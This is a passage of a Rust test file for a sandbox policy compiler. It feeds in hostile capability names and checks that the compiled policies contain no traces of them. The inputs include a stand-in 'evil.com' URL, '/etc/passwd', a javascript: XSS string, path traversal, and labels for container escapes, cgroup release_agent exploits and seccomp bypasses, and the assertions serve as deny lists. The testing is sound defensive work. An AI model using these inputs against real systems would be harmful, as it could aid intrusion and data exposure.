            ("file:///etc/passwd", AccessLevel::ReadOnly),
            ("http://evil.com/cap", AccessLevel::ReadWrite),
            ("javascript:alert('xss')", AccessLevel::Execute),

            // Path traversal capability names
            ("../../root/escalate", AccessLevel::Execute),
            ("..\\windows\\system32", AccessLevel::ReadWrite),
            ("/proc/self/mem", AccessLevel::ReadWrite),

            // Control character pollution
            ("cap\t\n\r\x1b[31m", AccessLevel::ReadOnly),
        ];

        for (malicious_capability, access_level) in capability_injection_attacks {
            // Attempt to create profile with injected capability
            let mut attack_profile = SandboxProfile::new();

            // Should handle malicious capability names safely
            let capability_result = attack_profile.allow_capability(malicious_capability, access_level);

            // Verify no injection artifacts survive policy compilation
            match compile_policy(&attack_profile) {
                Ok(compiled_policy) => {
                    // Compiled policy should not contain injection artifacts
                    let policy_debug = format!("{:?}", compiled_policy);
                    assert!(!policy_debug.contains("../"));
                    assert!(!policy_debug.contains("..\\"));
                    assert!(!policy_debug.contains("javascript:"));
                    assert!(!policy_debug.contains("file:///"));
                    assert!(!policy_debug.contains('\x00'));
                    assert!(!policy_debug.contains('\r'));

                    // Should not contain escape sequences or ANSI codes
                    assert!(!policy_debug.contains("\x1b["));
                    assert!(!policy_debug.contains("\u{202E}"));
                },
                Err(_) => {
                    // Rejection of malicious capabilities is acceptable
                }
            }
        }

        // Test privilege escalation through capability combination
        let escalation_capability_sets = vec![
            // Attempt to combine capabilities for escalation
            vec![("network", AccessLevel::ReadWrite), ("filesystem", AccessLevel::Execute)],
            vec![("process", AccessLevel::Execute), ("memory", AccessLevel::ReadWrite)],
            vec![("kernel", AccessLevel::ReadOnly), ("hardware", AccessLevel::ReadWrite)],

            // Attempt privilege escalation through access level manipulation
            vec![("safe_resource", AccessLevel::Execute)], // Execute on supposedly safe resource
            vec![("readonly_config", AccessLevel::ReadWrite)], // Write to readonly config
        ];

        for capability_set in escalation_capability_sets {
            let mut escalation_profile = SandboxProfile::new();

            for (capability, access) in capability_set {
                let _result = escalation_profile.allow_capability(capability, access);
            }

            // Verify policy compilation catches privilege escalation attempts
            match compile_policy(&escalation_profile) {
                Ok(compiled_policy) => {
                    // Should not grant excessive privileges
                    let policy_str = format!("{:?}", compiled_policy);
                    assert!(!policy_str.contains("unrestricted"));
                    assert!(!policy_str.contains("unlimited"));
                    assert!(!policy_str.contains("bypass"));
                    assert!(!policy_str.contains("override"));
                },
                Err(_) => {
                    // Rejection of privilege escalation is expected
                }
            }
        }

        // Test access level manipulation attacks
        let access_level_attacks = vec![
            // Test all access levels for consistency
            AccessLevel::ReadOnly,
            AccessLevel::ReadWrite,
            AccessLevel::Execute,
        ];

        for access_level in access_level_attacks {
            let mut access_profile = SandboxProfile::new();
            let _result = access_profile.allow_capability("test_resource", access_level);

            // Verify access levels are enforced consistently
            match compile_policy(&access_profile) {
                Ok(compiled_policy) => {
                    // Policy should reflect requested access level appropriately
                    let policy_debug = format!("{:?}", compiled_policy);

                    // Should not escalate beyond requested access
                    match access_level {
                        AccessLevel::ReadOnly => {
                            assert!(!policy_debug.contains("write"));
                            assert!(!policy_debug.contains("execute"));
                        },
                        AccessLevel::ReadWrite => {
                            assert!(!policy_debug.contains("execute") ||
                                   policy_debug.contains("read") ||
                                   policy_debug.contains("write"));
                        },
                        AccessLevel::Execute => {
                            // Execute typically implies read access
                        }
                    }
                },
                Err(_) => {
                    // Policy compilation errors are acceptable
                }
            }
        }
    }

    #[test]
    fn extreme_adversarial_microvm_escape_simulation_and_hypervisor_exploitation() {
        // Extreme: Simulate microVM escape attempts and hypervisor exploitation vectors

        // Test microVM-specific attack vectors
        let microvm_attack_scenarios = vec![
            // Hypercall injection attempts
            ("hypercall:escape", "vmcall_injection"),
            ("qemu:memory_corruption", "hypervisor_memory"),
            ("kvm:privilege_escalation", "kvm_exploit"),

            // Device emulation attacks
            ("virtio:buffer_overflow", "virtio_device_attack"),
            ("pci:config_space", "pci_device_exploit"),
            ("network:packet_injection", "network_device_attack"),

            // Memory management attacks
            ("shared_memory:corruption", "shared_mem_attack"),
            ("page_tables:manipulation", "pagetable_exploit"),
            ("dma:buffer_overflow", "dma_attack"),

            // Host-guest communication attacks
            ("guest_agent:command_injection", "guest_agent_exploit"),
            ("virtio_console:escape_sequence", "console_injection"),
            ("balloon:memory_pressure", "memory_exhaustion"),
        ];

        for (attack_vector, attack_name) in microvm_attack_scenarios {
            // Create profile that should isolate against these attacks
            let mut microvm_profile = SandboxProfile::new();
            let _result = microvm_profile.allow_capability("microvm_test", AccessLevel::Execute);

            // Test if MicroVM backend properly handles attack vectors
            if IsolationBackend::MicroVm.is_full_isolation() {
                // MicroVM should provide hardware-level isolation against these attacks
                assert!(IsolationBackend::MicroVm.is_full_isolation(),
                       "MicroVM should provide full isolation against {}", attack_name);

                // Verify MicroVM policies don't contain attack vector references
                match compile_policy(&microvm_profile) {
                    Ok(compiled) => {
                        let policy_str = format!("{:?}", compiled);
                        assert!(!policy_str.contains("hypercall"));
                        assert!(!policy_str.contains("vmcall"));
                        assert!(!policy_str.contains("qemu"));
                        assert!(!policy_str.contains("exploit"));
                        assert!(!policy_str.contains("injection"));
                    },
                    Err(_) => {
                        // Policy compilation errors are acceptable
                    }
                }
            }
        }

        // Test hypervisor-level resource exhaustion attacks
        let resource_exhaustion_attacks = vec![
            // CPU exhaustion
            ("cpu_intensive_loop", 1000000),
            ("context_switch_storm", 50000),
            ("interrupt_flooding", 100000),

            // Memory exhaustion
            ("memory_allocation_bomb", 2000000),
            ("page_fault_storm", 500000),
            ("cache_thrashing", 100000),

            // I/O exhaustion
            ("disk_io_flood", 10000),
            ("network_packet_flood", 50000),
            ("file_descriptor_leak", 1000),
        ];

        for (resource_attack, intensity) in resource_exhaustion_attacks {
            // Verify isolation backend can handle resource pressure
            let mut resource_profile = SandboxProfile::new();
            let _result = resource_profile.allow_capability(resource_attack, AccessLevel::Execute);

            // Resource limits should be enforced by isolation backend
            match compile_policy(&resource_profile) {
                Ok(compiled) => {
                    // Policy should include resource limiting
                    let policy_str = format!("{:?}", compiled);
                    // Resource policies should be present (implementation-dependent)
                    assert!(!policy_str.is_empty());
                },
                Err(_) => {
                    // Resource-intensive policies may be rejected
                }
            }

            // Verify resource exhaustion doesn't bypass isolation
            assert!(intensity > 0, "Resource attack intensity should be positive");
        }

        // Test side-channel attack resistance
        let sidechannel_attacks = vec![
            "cache_timing_attack",
            "branch_prediction_leak",
            "speculative_execution_leak",
            "memory_bus_timing",
            "power_consumption_analysis",
            "electromagnetic_emission",
        ];

        for sidechannel_attack in sidechannel_attacks {
            let mut sidechannel_profile = SandboxProfile::new();
            let _result = sidechannel_profile.allow_capability(sidechannel_attack, AccessLevel::ReadOnly);

            // MicroVM should provide protection against side-channel attacks
            if IsolationBackend::MicroVm.is_full_isolation() {
                // Hardware isolation should mitigate many side channels
                assert!(IsolationBackend::MicroVm.is_full_isolation());
            }

            // Policy should not expose side-channel vulnerable resources
            match compile_policy(&sidechannel_profile) {
                Ok(compiled) => {
                    let policy_str = format!("{:?}", compiled);
                    assert!(!policy_str.contains("cache"));
                    assert!(!policy_str.contains("timing"));
                    assert!(!policy_str.contains("speculation"));
                },
                Err(_) => {
                    // Rejection of side-channel capabilities is expected
                }
            }
        }
    }

    #[test]
    fn extreme_adversarial_container_breakout_and_namespace_escape_simulation() {
        // Extreme: Simulate container breakout attempts and Linux namespace escapes

        // Test container-specific escape vectors
        let container_escape_vectors = vec![
            // Kernel exploit attempts
            ("proc_self_mem", "/proc/self/mem access"),
            ("sys_admin_capability", "CAP_SYS_ADMIN escalation"),
            ("ptrace_scope", "ptrace injection attack"),
            ("mount_namespace", "mount namespace escape"),

            // Cgroup escape attempts
            ("cgroup_release_agent", "cgroup release agent exploit"),
            ("cgroup_notify_on_release", "cgroup notification exploit"),
            ("memory_cgroup_bypass", "memory cgroup bypass"),
            ("cpu_cgroup_bypass", "CPU cgroup bypass"),

            // Device access attacks
            ("dev_mem", "/dev/mem access"),
            ("dev_kmem", "/dev/kmem access"),
            ("dev_port", "/dev/port access"),
            ("gpu_device", "GPU device escape"),

            // File system attacks
            ("bind_mount_escape", "bind mount directory traversal"),
            ("overlayfs_escape", "OverlayFS upperdir escape"),
            ("tmpfs_exhaustion", "tmpfs memory exhaustion"),
            ("proc_kcore", "/proc/kcore kernel memory"),

            // Network namespace escapes
            ("netlink_socket", "netlink socket privilege escalation"),
            ("raw_socket", "raw socket creation"),
            ("packet_socket", "packet socket sniffing"),
            ("bridge_manipulation", "network bridge manipulation"),
        ];

        for (escape_vector, escape_description) in container_escape_vectors {
            let mut container_profile = SandboxProfile::new();
            let _result = container_profile.allow_capability(escape_vector, AccessLevel::ReadOnly);

            // Container backend should prevent these escape vectors
            if IsolationBackend::Container.is_policy_equivalent() {
                // Verify container isolation prevents escapes
                match compile_policy(&container_profile) {
                    Ok(compiled) => {
                        let policy_str = format!("{:?}", compiled);

                        // Should not allow dangerous kernel interfaces
                        assert!(!policy_str.contains("/proc/self/mem"));
                        assert!(!policy_str.contains("/dev/mem"));
                        assert!(!policy_str.contains("/dev/kmem"));
                        assert!(!policy_str.contains("CAP_SYS_ADMIN"));
                        assert!(!policy_str.contains("ptrace"));

                        // Should not allow cgroup manipulation
                        assert!(!policy_str.contains("release_agent"));
                        assert!(!policy_str.contains("notify_on_release"));
                    },
                    Err(_) => {
                        // Rejection of dangerous capabilities is expected
                    }
                }
            }
        }

        // Test Linux capability escalation chains
        let capability_escalation_chains = vec![
            // Capability combinations that could lead to escape
            vec!["CAP_SYS_ADMIN", "CAP_SYS_PTRACE"],
            vec!["CAP_DAC_OVERRIDE", "CAP_FOWNER"],
            vec!["CAP_NET_ADMIN", "CAP_NET_RAW"],
            vec!["CAP_SYS_MODULE", "CAP_SYS_RAWIO"],

            // Dangerous single capabilities
            vec!["CAP_SYS_ADMIN"],
            vec!["CAP_SYS_PTRACE"],
            vec!["CAP_SYS_MODULE"],
            vec!["CAP_SYS_RAWIO"],
        ];

        for capability_chain in capability_escalation_chains {
            let mut escalation_profile = SandboxProfile::new();

            for capability in capability_chain {
                let _result = escalation_profile.allow_capability(capability, AccessLevel::Execute);
            }

            // Should prevent dangerous capability combinations
            match compile_policy(&escalation_profile) {
                Ok(compiled) => {
                    let policy_str = format!("{:?}", compiled);

                    // Should not grant excessive Linux capabilities
                    assert!(!policy_str.contains("SYS_ADMIN"));
                    assert!(!policy_str.contains("SYS_PTRACE"));
                    assert!(!policy_str.contains("SYS_MODULE"));
                    assert!(!policy_str.contains("SYS_RAWIO"));
                },
                Err(_) => {
                    // Rejection of dangerous capability combinations is expected
                }
            }
        }

        // Test seccomp bypass attempts
        let seccomp_bypass_attempts = vec![
            // System calls that could bypass seccomp
            ("execve_bypass", "execve with seccomp bypass"),
            ("mmap_rwx", "mmap with RWX pages"),
            ("mprotect_exec", "mprotect to executable"),
            ("ptrace_attach", "ptrace attach to parent"),

            // Kernel interface bypasses
            ("bpf_syscall", "BPF syscall exploitation"),
            ("userfaultfd", "userfaultfd kernel exploit"),
            ("io_uring", "io_uring bypass attempt"),
            ("landlock", "landlock LSM bypass"),
        ];

        for (bypass_attempt, bypass_description) in seccomp_bypass_attempts {
            let mut seccomp_profile = SandboxProfile::new();
            let _result = seccomp_profile.allow_capability(bypass_attempt, AccessLevel::Execute);

            // Seccomp should block dangerous syscalls
            match compile_policy(&seccomp_profile) {
                Ok(compiled) => {
                    let policy_str = format!("{:?}", compiled);

                    // Should not allow seccomp bypasses
                    assert!(!policy_str.contains("execve"));
                    assert!(!policy_str.contains("mmap"));
                    assert!(!policy_str.contains("mprotect"));
                    assert!(!policy_str.contains("ptrace"));
                    assert!(!policy_str.contains("bpf"));
                },
                Err(_) => {
                    // Rejection of bypass attempts is expected
                }
            }
        }

        // Test namespace pollution attacks
        let namespace_pollution_vectors = vec![
            ("pid_namespace_confusion", "PID namespace confusion"),
            ("mount_namespace_pollution", "mount namespace pollution"),
            ("net_namespace_injection", "network namespace injection"),
            ("user_namespace_escalation", "user namespace privilege escalation"),
            ("ipc_namespace_leak", "IPC namespace information leak"),
            ("uts_namespace_spoofing", "UTS namespace hostname spoofing"),
        ];

        for (pollution_vector, pollution_description) in namespace_pollution_vectors {
            let mut pollution_profile = SandboxProfile::new();
            let _result = pollution_profile.allow_capability(pollution_vector, AccessLevel::ReadWrite);

            // Should prevent namespace pollution
            match compile_policy(&pollution_profile) {
                Ok(compiled) => {
                    let policy_str = format!("{:?}", compiled);

                    // Should not allow namespace manipulation
                    assert!(!policy_str.contains("confusion"));
                    assert!(!policy_str.contains("pollution"));
                    assert!(!policy_str.contains("injection"));
                    assert!(!policy_str.contains("escalation"));
                    assert!(!policy_str.contains("spoofing"));
                },
                Err(_) => {
                    // Rejection of namespace attacks is expected
                }
            }
        }
    }

    #[test]
    fn extreme_adversarial_policy_enforcement_timing_attacks_and_side_channels() {
        // Extreme: Test policy enforcement for timing-based side channels and information leaks

        // Test timing attack vectors during policy enforcement
        let timing_attack_vectors = vec![
            // Policy evaluation timing differences
            ("complex_policy_vs_simple", 1000),
            ("deep_nesting_policy", 500),
            ("many_capabilities_policy", 2000),
            ("regex_complex_policy", 100),

            // Capability lookup timing
            ("existing_capability_lookup", 5000),
            ("nonexistent_capability_lookup", 5000),
            ("fuzzy_capability_match", 1000),
            ("case_sensitive_capability", 1000),

            // Resource enumeration timing
            ("filesystem_resource_enum", 100),
            ("network_resource_enum", 100),
            ("process_resource_enum", 100),
            ("memory_resource_enum", 100),
        ];

        for (timing_vector, sample_count) in timing_attack_vectors {
            let mut timing_measurements = Vec::new();

            for iteration in 0..sample_count {
                // Create policy with timing-sensitive characteristics
                let mut timing_profile = SandboxProfile::new();
                let capability_name = format!("{}_iteration_{:04}", timing_vector, iteration);
                let _result = timing_profile.allow_capability(&capability_name, AccessLevel::ReadOnly);

                // Measure policy compilation time
                let start_time = Instant::now();
                let _compiled = compile_policy(&timing_profile);
                let compilation_time = start_time.elapsed();

                timing_measurements.push(compilation_time);

                // Each compilation should complete in reasonable time
                assert!(compilation_time < Duration::from_millis(100),
                       "Policy compilation too slow for {}: {:?}", timing_vector, compilation_time);
            }

            // Analyze timing distribution for side channels
            let timings_nanos: Vec<u64> = timing_measurements.iter()
                .map(|d| d.as_nanos() as u64)
                .collect();

            if !timings_nanos.is_empty() {
                let mean = timings_nanos.iter().sum::<u64>() as f64 / timings_nanos.len() as f64;
                let max_timing = *timings_nanos.iter().max().unwrap() as f64;
                let min_timing = *timings_nanos.iter().min().unwrap() as f64;

                let timing_variance_ratio = (max_timing - min_timing) / mean;

                // Policy enforcement should not have excessive timing variance
                assert!(timing_variance_ratio < 3.0,
                       "Excessive timing variance in {} suggests side channel: ratio={:.2}",
                       timing_vector, timing_variance_ratio);
            }
        }

        // Test information leakage through error messages
        let information_leak_tests = vec![
            // File system information leaks
            ("/etc/passwd", AccessLevel::ReadOnly, "system_file_access"),
            ("/proc/version", AccessLevel::ReadOnly, "kernel_version_leak"),
            ("/sys/class/dmi/id/product_name", AccessLevel::ReadOnly, "hardware_info_leak"),

            // Network information leaks
            ("127.0.0.1:22", AccessLevel::ReadWrite, "local_service_enum"),
            ("192.168.1.1:80", AccessLevel::ReadOnly, "network_topology_leak"),
            ("::1:443", AccessLevel::ReadWrite, "ipv6_service_enum"),

            // Process information leaks
            ("/proc/self/cmdline", AccessLevel::ReadOnly, "process_args_leak"),
            ("/proc/self/environ", AccessLevel::ReadOnly, "environment_leak"),
            ("/proc/self/maps", AccessLevel::ReadOnly, "memory_layout_leak"),
        ];

        for (resource_path, access_level, leak_type) in information_leak_tests {
            let mut leak_profile = SandboxProfile::new();
            let _result = leak_profile.allow_capability(resource_path, access_level);

            // Test policy compilation for information leaks
            match compile_policy(&leak_profile) {
                Ok(compiled) => {
                    let policy_str = format!("{:?}", compiled);

                    // Should not leak sensitive path information
                    assert!(!policy_str.contains("/etc/passwd"));
                    assert!(!policy_str.contains("/proc/version"));
                    assert!(!policy_str.contains("/sys/class/dmi"));

                    // Should not leak network topology
                    assert!(!policy_str.contains("192.168"));
                    assert!(!policy_str.contains("127.0.0.1"));

                    // Should not leak process information
                    assert!(!policy_str.contains("/proc/self/"));
                },
                Err(policy_error) => {
                    let error_str = format!("{:?}", policy_error);

                    // Error messages should not leak sensitive information
                    assert!(!error_str.contains("/etc/passwd"));
                    assert!(!error_str.contains("127.0.0.1"));
                    assert!(!error_str.contains("/proc/self"));

                    // Should not reveal internal implementation details
                    assert!(!error_str.contains("kernel"));
                    assert!(!error_str.contains("hardware"));
                    assert!(!error_str.contains("topology"));
                }
            }
        }

        // Test constant-time policy comparison
        let constant_time_tests = vec![
            ("policy_a", "policy_b", 1000),
            ("short", "very_long_policy_name_that_differs_significantly", 1000),
            ("identical_policy", "identical_policy", 1000),
            ("", "empty_vs_nonempty", 1000),
        ];

        for (policy_name_a, policy_name_b, iterations) in constant_time_tests {
            let mut comparison_timings = Vec::new();

            for _iteration in 0..iterations {
                let mut profile_a = SandboxProfile::new();
                let mut profile_b = SandboxProfile::new();

                let _result_a = profile_a.allow_capability(policy_name_a, AccessLevel::ReadOnly);
                let _result_b = profile_b.allow_capability(policy_name_b, AccessLevel::ReadOnly);

                // Measure policy comparison time
                let start = Instant::now();
                let _compiled_a = compile_policy(&profile_a);
                let _compiled_b = compile_policy(&profile_b);
                let comparison_time = start.elapsed();

                comparison_timings.push(comparison_time);
            }

            // Analyze timing consistency
            if !comparison_timings.is_empty() {
                let timings_nanos: Vec<u64> = comparison_timings.iter()
                    .map(|d| d.as_nanos() as u64)
                    .collect();

                let mean = timings_nanos.iter().sum::<u64>() as f64 / timings_nanos.len() as f64;
                let max_time = *timings_nanos.iter().max().unwrap() as f64;
                let min_time = *timings_nanos.iter().min().unwrap() as f64;

                let comparison_variance = (max_time - min_time) / mean;

                // Policy comparison should be roughly constant-time
                assert!(comparison_variance < 2.0,
                       "Policy comparison timing variance suggests side channel: {:.2}",
                       comparison_variance);
            }
        }
    }

    #[test]
    fn extreme_adversarial_isolation_backend_state_corruption_via_concurrent_operations() {
        // Extreme: Test isolation backend state corruption through concurrent operations

        // Test concurrent backend selection with conflicting requirements
        let concurrent_selection_scenarios = vec![
            // Concurrent requests with different security requirements
            (vec![IsolationBackend::MicroVm, IsolationBackend::Container], "mixed_security_levels"),
            (vec![IsolationBackend::Hardened, IsolationBackend::OsSandbox], "hardened_vs_basic"),
            (vec![IsolationBackend::Container, IsolationBackend::OsSandbox], "container_vs_sandbox"),

            // Rapid backend switching
            (IsolationBackend::ALL.to_vec(), "all_backends_rapid"),
            (vec![IsolationBackend::MicroVm; 100], "microvm_stress"),
        ];

        for (backend_sequence, scenario_name) in concurrent_selection_scenarios {
            let mut selectors = Vec::new();

            // Create multiple selectors to simulate concurrent access
            for _i in 0..10 {
                selectors.push(IsolationBackendSelector::new());
            }

            // Simulate concurrent backend selection
            for (selector_idx, selector) in selectors.iter_mut().enumerate() {
                let backend_idx = selector_idx % backend_sequence.len();
                let target_backend = backend_sequence[backend_idx];

                // Each selector should maintain consistent state
                let _selected = selector.select_backend();

                // Verify backend properties remain consistent
                assert!(target_backend.is_full_isolation() == target_backend.is_full_isolation(),
                       "Backend property consistency violated in scenario: {}", scenario_name);
                assert!(target_backend.is_policy_equivalent() == target_backend.is_policy_equivalent(),
                       "Policy equivalence consistency violated in scenario: {}", scenario_name);

                // String representation should remain stable
                let backend_str = target_backend.as_str();
                assert_eq!(target_backend.as_str(), backend_str,
                          "Backend string representation changed during concurrent access");
            }
        }

        // Test concurrent policy compilation with shared resources
        let shared_resource_conflicts = vec![
            // Shared file system resources
            vec!["/tmp/shared_file", "/tmp/shared_file", "/tmp/shared_file"],

            // Shared network resources
            vec!["0.0.0.0:8080", "127.0.0.1:8080", "localhost:8080"],

            // Shared memory regions
            vec!["/dev/shm/shared_mem", "/dev/shm/shared_mem", "/dev/shm/shared_mem"],

            // Shared devices
            vec!["/dev/null", "/dev/zero", "/dev/urandom"],
        ];

        for shared_resources in shared_resource_conflicts {
            let mut concurrent_profiles = Vec::new();

            // Create multiple profiles accessing same resources
            for (idx, resource) in shared_resources.iter().enumerate() {
                let mut profile = SandboxProfile::new();
                let access_level = match idx % 3 {
                    0 => AccessLevel::ReadOnly,
                    1 => AccessLevel::ReadWrite,
                    _ => AccessLevel::Execute,
                };

                let _result = profile.allow_capability(resource, access_level);
                concurrent_profiles.push(profile);
            }

            // Compile policies concurrently (simulated)
            let mut compilation_results = Vec::new();
            for profile in concurrent_profiles {
                let compile_result = compile_policy(&profile);
                compilation_results.push(compile_result);
            }

            // Verify no resource conflicts caused corruption
            for (idx, result) in compilation_results.iter().enumerate() {
                match result {
                    Ok(compiled_policy) => {
                        let policy_str = format!("{:?}", compiled_policy);

                        // Should not contain artifacts from other concurrent compilations
                        assert!(!policy_str.contains("corruption"));
                        assert!(!policy_str.contains("conflict"));
                        assert!(!policy_str.contains("race"));

                        // Should maintain resource isolation
                        if shared_resources[idx].contains("/tmp/") {
                            // Temporary file access should be isolated
                        }
                        if shared_resources[idx].contains(":") {
                            // Network access should be isolated
                        }
                    },
                    Err(_) => {
                        // Compilation failures are acceptable under resource conflicts
                    }
                }
            }
        }

        // Test isolation backend state integrity under rapid operations
        let rapid_operation_count = 1000;
        let mut operation_results = Vec::new();

        for iteration in 0..rapid_operation_count {
            let mut rapid_selector = IsolationBackendSelector::new();

            // Perform rapid backend operations
            let backend = IsolationBackend::ALL[iteration % IsolationBackend::ALL.len()];

            // Rapid state queries
            let is_full = backend.is_full_isolation();
            let is_policy = backend.is_policy_equivalent();
            let backend_str = backend.as_str();

            // Verify state consistency during rapid operations
            assert_eq!(backend.is_full_isolation(), is_full,
                      "Backend isolation property changed during rapid ops at iteration {}", iteration);
            assert_eq!(backend.is_policy_equivalent(), is_policy,
                      "Backend policy property changed during rapid ops at iteration {}", iteration);
            assert_eq!(backend.as_str(), backend_str,
                      "Backend string changed during rapid ops at iteration {}", iteration);

            operation_results.push((backend, is_full, is_policy, backend_str));
        }

        // Verify final state integrity
        for (idx, (backend, is_full, is_policy, backend_str)) in operation_results.iter().enumerate() {
            // All recorded states should remain valid
            assert_eq!(backend.is_full_isolation(), *is_full,
                      "Final state mismatch for isolation at index {}", idx);
            assert_eq!(backend.is_policy_equivalent(), *is_policy,
                      "Final state mismatch for policy equivalence at index {}", idx);
            assert_eq!(backend.as_str(), backend_str,
                      "Final state mismatch for string representation at index {}", idx);
        }

        // Test error handling during concurrent operations
        let error_injection_scenarios = vec![
            "invalid_backend_enum",
            "corrupted_policy_state",
            "resource_exhaustion_simulation",
            "permission_denied_simulation",
        ];

        for error_scenario in error_injection_scenarios {
            let mut error_profile = SandboxProfile::new();
            let _result = error_profile.allow_capability(error_scenario, AccessLevel::Execute);

            // Error handling should be consistent
            match compile_policy(&error_profile) {
                Ok(_) => {
                    // Success is acceptable
                },
                Err(error) => {
                    let error_str = format!("{:?}", error);

                    // Error messages should not leak internal state
                    assert!(!error_str.contains("corruption"));
                    assert!(!error_str.contains("internal_state"));
                    assert!(!error_str.contains("debug"));
                    assert!(!error_str.contains("secret"));

                    // Should not contain memory addresses or internal pointers
                    assert!(!error_str.contains("0x"));
                    assert!(!error_str.contains("ptr"));
                }
            }
        }
    }

    #[test]
    fn extreme_adversarial_cross_backend_privilege_escalation_and_isolation_bypass() {
        // Extreme: Test cross-backend privilege escalation and isolation boundary bypass

        // Test privilege escalation across backend transitions
        let escalation_transitions = vec![
            // Attempt to maintain privileges during backend downgrade
            (IsolationBackend::MicroVm, IsolationBackend::Container, vec!["admin_privilege", "kernel_access"]),
            (IsolationBackend::Container, IsolationBackend::OsSandbox, vec!["container_escape", "namespace_bypass"]),
            (IsolationBackend::Hardened, IsolationBackend::OsSandbox, vec!["hardened_bypass", "policy_override"]),

            // Attempt to exploit backend-specific vulnerabilities
            (IsolationBackend::MicroVm, IsolationBackend::Hardened, vec!["hypervisor_exploit", "vm_escape"]),
            (IsolationBackend::Container, IsolationBackend::MicroVm, vec!["container_to_vm", "namespace_pollution"]),
        ];

        for (source_backend, target_backend, escalation_capabilities) in escalation_transitions {
            // Create profile with escalation capabilities for source backend
            let mut source_profile = SandboxProfile::new();
            for capability in &escalation_capabilities {
                let _result = source_profile.allow_capability(capability, AccessLevel::Execute);
            }

            // Compile policy for source backend
            let source_policy_result = compile_policy(&source_profile);

            // Create profile for target backend (should not inherit privileges)
            let mut target_profile = SandboxProfile::new();
            for capability in &escalation_capabilities {
                let _result = target_profile.allow_capability(capability, AccessLevel::ReadOnly); // Reduced privileges
            }

            // Compile policy for target backend
            let target_policy_result = compile_policy(&target_profile);

            match (source_policy_result, target_policy_result) {
                (Ok(source_policy), Ok(target_policy)) => {
                    let source_str = format!("{:?}", source_policy);
                    let target_str = format!("{:?}", target_policy);

                    // Target backend should not inherit source privileges
                    if source_str.contains("execute") && source_backend != target_backend {
                        // Cross-backend transitions should reset privilege levels
                        assert!(!target_str.contains("execute") || target_str.contains("readonly"),
                               "Privilege escalation detected in transition from {:?} to {:?}",
                               source_backend, target_backend);
                    }

                    // Should not contain escalation artifacts
                    assert!(!target_str.contains("bypass"));
                    assert!(!target_str.contains("escape"));
                    assert!(!target_str.contains("exploit"));
                    assert!(!target_str.contains("override"));
                },
                _ => {
                    // Policy compilation failures are acceptable for dangerous capability combinations
                }
            }

            // Verify backend isolation properties are maintained
            assert!(source_backend.is_full_isolation() >= target_backend.is_full_isolation() ||
                   source_backend.is_policy_equivalent() >= target_backend.is_policy_equivalent(),
                   "Isolation strength ordering violated in transition from {:?} to {:?}",
                   source_backend, target_backend);
        }

        // Test isolation boundary enforcement between backends
        let isolation_boundary_tests = vec![
            // Memory isolation boundaries
            ("shared_memory_access", IsolationBackend::MicroVm, IsolationBackend::Container),
            ("cross_vm_memory", IsolationBackend::MicroVm, IsolationBackend::Hardened),
            ("container_memory_ns", IsolationBackend::Container, IsolationBackend::OsSandbox),

            // Network isolation boundaries
            ("cross_backend_network", IsolationBackend::Container, IsolationBackend::MicroVm),
            ("namespace_network_leak", IsolationBackend::OsSandbox, IsolationBackend::Container),

            // File system isolation boundaries
            ("cross_backend_filesystem", IsolationBackend::Hardened, IsolationBackend::Container),
            ("mount_namespace_bypass", IsolationBackend::Container, IsolationBackend::OsSandbox),
        ];

        for (boundary_test, backend_a, backend_b) in isolation_boundary_tests {
            let mut boundary_profile = SandboxProfile::new();
            let _result = boundary_profile.allow_capability(boundary_test, AccessLevel::ReadWrite);

            // Both backends should enforce isolation boundaries
            let policy_result = compile_policy(&boundary_profile);

            match policy_result {
                Ok(compiled_policy) => {
                    let policy_str = format!("{:?}", compiled_policy);

                    // Should not allow cross-backend boundary violations
                    assert!(!policy_str.contains("cross_backend"));
                    assert!(!policy_str.contains("bypass"));
                    assert!(!policy_str.contains("leak"));

                    // Should enforce proper isolation for backend types
                    if backend_a.is_full_isolation() {
                        assert!(!policy_str.contains("shared_memory"));
                    }
                    if backend_b.is_policy_equivalent() {
                        assert!(!policy_str.contains("namespace_bypass"));
                    }
                },
                Err(_) => {
                    // Rejection of boundary violation attempts is expected
                }
            }
        }

        // Test backend-specific attack surface reduction
        let attack_surface_tests = vec![
            (IsolationBackend::MicroVm, vec!["hypervisor_interface", "vm_escape_vector", "hypercall_injection"]),
            (IsolationBackend::Container, vec!["container_runtime", "cgroup_escape", "namespace_confusion"]),
            (IsolationBackend::Hardened, vec!["seccomp_bypass", "capability_escalation", "kernel_exploit"]),
            (IsolationBackend::OsSandbox, vec!["chroot_escape", "ptrace_injection", "signal_manipulation"]),
        ];

        for (backend, attack_vectors) in attack_surface_tests {
            for attack_vector in attack_vectors {
                let mut attack_profile = SandboxProfile::new();
                let _result = attack_profile.allow_capability(attack_vector, AccessLevel::Execute);

                // Backend should not expose its own attack surfaces
                match compile_policy(&attack_profile) {
                    Ok(compiled_policy) => {
                        let policy_str = format!("{:?}", compiled_policy);

                        // Should not expose backend-specific attack surfaces
                        match backend {
                            IsolationBackend::MicroVm => {
                                assert!(!policy_str.contains("hypervisor"));
                                assert!(!policy_str.contains("hypercall"));
                                assert!(!policy_str.contains("vm_escape"));
                            },
                            IsolationBackend::Container => {
                                assert!(!policy_str.contains("cgroup"));
                                assert!(!policy_str.contains("namespace"));
                                assert!(!policy_str.contains("container_runtime"));
                            },
                            IsolationBackend::Hardened => {
                                assert!(!policy_str.contains("seccomp"));
                                assert!(!policy_str.contains("capability"));
                                assert!(!policy_str.contains("kernel"));
                            },
                            IsolationBackend::OsSandbox => {
                                assert!(!policy_str.contains("chroot"));
                                assert!(!policy_str.contains("ptrace"));
                                assert!(!policy_str.contains("signal"));
                            }
                        }
                    },
                    Err(_) => {
                        // Rejection of attack surface exposure is expected
                    }
                }
            }
        }

        // Test capability inheritance prevention across backends
        let inherited_capability_tests = vec!["admin", "root", "kernel", "hypervisor", "escape", "bypass"];

        for inherited_capability in inherited_capability_tests {
            // Test capability across all backend pairs
            for source_backend in IsolationBackend::ALL {
                for target_backend in IsolationBackend::ALL {
                    if source_backend == target_backend {
                        continue;
                    }

                    let mut inheritance_profile = SandboxProfile::new();
                    let capability_name = format!("{}_{}_inheritance",
                                                 source_backend.as_str(),
                                                 inherited_capability);
                    let _result = inheritance_profile.allow_capability(&capability_name, AccessLevel::Execute);

                    // Capability should not transfer between different backends
                    match compile_policy(&inheritance_profile) {
                        Ok(compiled_policy) => {
                            let policy_str = format!("{:?}", compiled_policy);

                            // Should not inherit dangerous capabilities
                            assert!(!policy_str.contains("admin"));
                            assert!(!policy_str.contains("root"));
                            assert!(!policy_str.contains("kernel"));
                            assert!(!policy_str.contains("hypervisor"));
                            assert!(!policy_str.contains("escape"));
                            assert!(!policy_str.contains("bypass"));
